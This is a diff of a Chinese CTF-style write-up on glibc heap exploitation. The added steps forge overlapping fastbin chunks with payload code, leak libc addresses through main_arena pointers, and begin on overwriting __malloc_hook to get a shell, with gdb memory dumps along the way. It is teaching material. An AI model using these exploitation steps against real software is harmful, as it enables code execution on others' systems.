@@ -276,6 +276,7 @@ if (__builtin_expect (nextchunk->size <= 2 * SIZE_SZ, 0)
 payload='A'*0x30 + p64(0) + p64(0x41) + 'B'*0x30 + p64(0) + p64(0x41) 
 fill(0,payload)
 free(1)
+
 gdb-peda$ x /64wx 0x555555757060
 0x555555757060:	0xf7ffd9d8	0x00007fff	0x00000041	0x00000000      -->chunk0(fastbin, in use)
 0x555555757070:	0x41414141	0x41414141	0x41414141	0x41414141
@@ -292,7 +293,8 @@ gdb-peda$ x /64wx 0x555555757060
 0x555555757120:	0x00000000	0x00000000	0x00000000	0x00000000
 0x555555757130:	0x00000000	0x00000000	0x00000000	0x00000000
 ```
-可以看出修改之后的chunk1包含了chunk2的前0x20个字节，包含了chunk2的fd和bk区域,此时的堆栈情况如下,由于需要过free的检查机制，伪造了另一个chunk,
+可以看出修改之后的chunk1包含了chunk2的前0x20个字节，包含了chunk2的fd和bk区域,此时的堆栈情况如下,由于需要过free的检查机制，伪造了另一个chunk3<br>
+为什么没有chunk2在heap里面消失了，目前没找到合理的解释，我的猜测是free fake chunk1的时候，由于校验了nextchunksize，所以把fake chunk3当成chunk2更新进heap了，实际上chunk2还是在`0x5555557570c0`这个地址
 ```
 gdb-peda$ heap all
 0x555555757000 SIZE=0x30 DATA[0x555555757010] |................................| INUSED PREV_INUSE
@@ -308,8 +310,44 @@ Fastbin2 :
 0x5555557570a0 SIZE=0x40 DATA[0x5555557570b0] |........BBBBBBBBBBBBBBBBBBBBBBBB| INUSED PREV_INUSE      -->fake chunk1(fastbin, free)
 ```
 
+#### 第三步
+修复chunk2的size,然后free掉chunk2，这个时候chunk2的fd和bk就会被填充成main_arena上smallbin所在的地址，然后使用fake chunk1将chunk2的前0x20个字节dump出来
+```
+alloc(0x30)
+payload='A'*0x10 + p64(0) + p64(0x111)
+fill(1,payload)
+free(2)
+dump(1)
+
+gdb-peda$ x /64wx 0x555555757060
+0x555555757060:	0xf7ffd9d8	0x00007fff	0x00000041	0x00000000      -->chunk0(fastbin, in use)
+0x555555757070:	0x41414141	0x41414141	0x41414141	0x41414141
+0x555555757080:	0x41414141	0x41414141	0x41414141	0x41414141
+0x555555757090:	0x41414141	0x41414141	0x41414141	0x41414141
+0x5555557570a0:	0x00000000	0x00000000	0x00000041	0x00000000      --------------------------------|
+0x5555557570b0:	0x41414141	0x41414141	0x41414141	0x41414141                                      |--->fake chunk1(fastbin, in use)
+0x5555557570c0:	0x00000000	0x00000000	0x0000b1f1	0x00000000      -->chunk2(smallbin, free)       |
+0x5555557570d0:	0xf7bcbb78	0x00007fff	0xf7bcbb78	0x00007fff      ------------------------------- |     
+0x5555557570e0:	0x00000000	0x00000000	0x00000000	0x00000000
+0x5555557570f0:	0x00000000	0x00000000	0x00000000	0x00000000
+0x555555757100:	0x00000000	0x00000000	0x00000000	0x00000000
+```
+以上是泄露两种基址的方法
+
+## getshell
+泄露出libc基址意味着libc.so里面所有的东西都知道在哪里了，这里就需要找到一个执行任意命令的地方了
+### __malloc_hook
+malloc执行的时候会去读取__malloc_hook这个地方的值，然后判断是否为空，如果不为空就执行这个__malloc_hook，而__malloc_hook可以通过伪造fastbin链，去写__malloc_hook这个地方的值
+```
+void *(*hook) (size_t, const void *)
+   = atomic_forced_read (__malloc_hook);
+ if (__builtin_expect (hook != NULL, 0))
+   return (*hook)(bytes, RETURN_ADDRESS (0));
+```
 
 
 
 
+
+https://dangokyo.me/2017/12/12/introduction-on-ptmalloc-part-2/
 
